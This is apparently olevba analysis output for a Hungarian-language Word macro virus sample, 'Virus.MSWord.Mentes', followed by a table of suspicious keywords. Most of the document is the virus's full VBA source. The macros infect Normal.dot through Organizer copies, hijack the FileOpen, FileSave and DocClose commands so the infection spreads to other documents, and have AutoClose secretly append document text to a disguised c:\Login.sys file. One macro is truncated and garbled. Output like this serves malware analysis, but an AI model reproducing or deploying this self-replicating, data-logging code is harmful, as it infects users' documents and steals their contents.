olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim szöveg$
Dim i
Dim driÀÀÀ
On Error Resume Next
WordBasic.Rename "c:\Login.sys", "c:\Login.TXT"
Open "c:\Login.TXT" For Append As 1
szöveg$ = WordBasic.[GetText$](0, 65280)
Print #1, WordBasic.[FileName$]()
Print #1, WordBasic.[Date$]()
Print #1, WordBasic.[Time$]()
Print #1, szöveg$
Print #1, " docvége"
Print #1, " "
Close 1
WordBasic.Rename "c:\Login.TXT", "c:\Login.sys"
Err.Number = 0
On Error GoTo -1: On Error GoTo lbl2
WordBasic.ChDir "F:\"
WordBasic.Connect path:="\\\HS_WORKH\COMMON\STUDENT\TEMP"
i = 67
drive:
i = i + 1
If i = 91 Then GoTo lbl2
driÀÀÀ
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Elmenti az aktív dokumentumot vagy sablont"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim ment$
WordBasic.DisableInput 1
WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
On Error GoTo -1: On Error GoTo lbl3
WordBasic.CurValues.DocumentStatistics dlg
If dlg.LastSaved = "" Then GoTo lbl1
GoTo lbl3
lbl1:
WordBasic.Call "Killer.MENTES"
GoTo lbl4
lbl3:
WordBasic.Call "Killer.TERJED", ment$
lbl4:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Létezõ dokumentumot vagy sablont nyit meg"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim kod$
Dim a$
Dim path$
Dim noExtension$
Dim ment$
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo lbl2
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
kod$ = WordBasic.[GetPrivateProfileString$]("Word Info", "Kod", _
"MY.INI")
If kod$ = "aaa" Then GoTo clean
a$ = WordBasic.[FileName$]()
path$ = WordBasic.[FileNameInfo$](a$, 5)
noExtension$ = WordBasic.[FileNameInfo$](a$, 4)
WordBasic.FileSaveAs Name:=path$ + noExtension$ + ".doc", Format:=1
WordBasic.Call "Killer.TERJED", ment$
GoTo lbl2
clean:
WordBasic.Call "Killer.MAIN"
lbl2:
WordBasic.DisableAutoMacros (0)
End Sub

-------------------------------------------------------------------------------
VBA MACRO DocClose.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/DocClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Figyelmeztet a dokumentum elmentésére, majd bezárja az aktív ablakot"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DocClose.MAIN"
Dim b
Dim ment$
WordBasic.DisableInput 1
WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=1, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="10", Password:="", WritePassword:="", RecommendReadOnly:=0
If WordBasic.IsDocumentDirty() = 0 Then b = 1
On Error GoTo -1: On Error GoTo lbl1
ment$ = "1"
WordBasic.Call "Killer.TERJED", ment$
If b = 1 Then GoTo lbl2
WordBasic.FileClose
GoTo lbl1
lbl2:
WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
If dlg.Title = "" Then GoTo lbl3
WordBasic.FileClose (1)
GoTo lbl1
lbl3:
WordBasic.FileClose (2)
lbl1:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim kod$
Dim a$
Dim path$
Dim noExtension$
Dim ment$
WordBasic.DisableInput 1
kod$ = WordBasic.[GetPrivateProfileString$]("Word Info", "Kod", _
"MY.INI")
If kod$ = "aaa" Then GoTo clean
a$ = WordBasic.[FileName$]()
path$ = WordBasic.[FileNameInfo$](a$, 5)
noExtension$ = WordBasic.[FileNameInfo$](a$, 4)
WordBasic.FileSaveAs Name:=path$ + noExtension$ + ".doc", Format:=1
WordBasic.Call "Killer.TERJED", ment$
GoTo ok2
clean:
WordBasic.Call "Killer.MAIN"
ok2:
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.DisableAutoMacros (0)
End Sub
-------------------------------------------------------------------------------
VBA MACRO Killer.bas 
in file: Virus.MSWord.Mentes-dac29a6935b32cb1dd8767fba09d8ffbb15b2974 - OLE stream: 'Macros/VBA/Killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim f
Dim k
Dim i
ReDim name___$(9)
name___$(0) = "AutoClose"
name___$(1) = "FileSave"
name___$(2) = "FileSaveAs"
name___$(3) = "ToolsMacro"
name___$(4) = "AutoExec"
name___$(5) = "DocClose"
name___$(6) = "ListMacros"
name___$(7) = "FileOpen"
name___$(8) = "AutoOpen"
name___$(9) = "Killer"
f = 1
For k = 1 To 2
For i = 0 To 6
On Error GoTo -1: On Error GoTo lbl1
WordBasic.ToolsMacro Name:=name___$(i), Show:=f, Delete:=1
Next i
lbl1:
f = 3
Next k
Err.Number = 0
On Error Resume Next
WordBasic.ToolsMacro Name:="FileOpen", Show:=3, Delete:=1
Err.Number = 0
On Error Resume Next
WordBasic.ToolsMacro Name:="AutoOpen", Show:=1, Delete:=1
WordBasic.FileSave
End Sub

Private Sub TERJED(ment$)
Dim a$
Dim path$
Dim noExtension$
Dim b$
Dim i
Dim name_$
Dim j
ReDim name___$(9)
name___$(0) = "AutoClose"
name___$(1) = "FileSave"
name___$(2) = "FileSaveAs"
name___$(3) = "ToolsMacro"
name___$(4) = "AutoExec"
name___$(5) = "DocClose"
name___$(6) = "FileOpen"
name___$(7) = "AutoOpen"
name___$(8) = "Killer"
name___$(9) = "ListMacros"
On Error GoTo -1: On Error GoTo lbl3
a$ = WordBasic.[FileName$]()
path$ = WordBasic.[FileNameInfo$](a$, 5)
noExtension$ = WordBasic.[FileNameInfo$](a$, 4)
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsOptionsFileLocations(False)
dlg.path = "USER-DOT-PATH"
WordBasic.CurValues.ToolsOptionsFileLocations dlg
b$ = dlg.Setting
Err.Number = 0
On Error GoTo -1: On Error GoTo cont
SetAttr b$ + "\Normal.dot", 0
SetAttr b$ + "\Normal.dot", 32
cont:
For i = 1 To WordBasic.CountMacros(0)
    name_$ = WordBasic.[MacroName$](i, 0)
    If name_$ = "Killer" Then GoTo lbl2
Next i
For i = 0 To 9
    WordBasic.Organizer Copy:=1, Source:=a$, Destination:=b$ + "\Normal.dot", Name:=name___$(i), Tab:=3
Next i
ment$ = "1"
GoTo lbl3
lbl2:
For j = 1 To WordBasic.CountMacros(1)
    name_$ = WordBasic.[MacroName$](j, 1)
    If name_$ <> "Killer" Then GoTo lbl5
ment$ = "1"
GoTo lbl3
lbl5:
Next j
For j = 0 To 9
    WordBasic.Organizer Copy:=1, Source:=b$ + "\Normal.dot", Destination:=a$, Name:=name___$(j), Tab:=3
Next j
lbl3:
If ment$ = "1" Then GoTo lbl4
WordBasic.FileSave
lbl4:
End Sub

Private Sub MENTES()
Dim a$
Dim path$
Dim noExtension$
Dim a_
Dim ment$
a$ = WordBasic.[FileName$]()
path$ = WordBasic.[FileNameInfo$](a$, 5)
noExtension$ = WordBasic.[FileNameInfo$](a$, 4)
WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
On Error GoTo -1: On Error GoTo lbl2
WordBasic.CurValues.DocumentStatistics dlg
Dim dlg2 As Object: Set dlg2 = WordBasic.DialogRecord.FileSaveAs(False)
If dlg.LastSaved = "" Then GoTo lbl1
WordBasic.FileNew Template:=path$ + noExtension$ + ".doc", NewTemplate:=0
a_ = 1
WordBasic.CurValues.FileSaveAs dlg2
dlg2.Name = a$
GoTo ma
lbl1:
WordBasic.CurValues.FileSaveAs dlg2
ma:
Err.Number = 0
On Error GoTo -1: On Error GoTo lbl3
WordBasic.Dialog.FileSaveAs dlg2
WordBasic.FileSaveAs dlg2
a$ = WordBasic.[FileName$]()
path$ = WordBasic.[FileNameInfo$](a$, 5)
noExtension$ = WordBasic.[FileNameInfo$](a$, 4)
WordBasic.FileSaveAs Name:=path$ + noExtension$ + ".doc", Format:=1
TERJED (ment$)
GoTo lbl2
lbl3:
If a_ <> 1 Then GoTo lbl2
WordBasic.DisableAutoMacros (1)
WordBasic.FileClose (2)
WordBasic.DisableAutoMacros (0)
lbl2:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

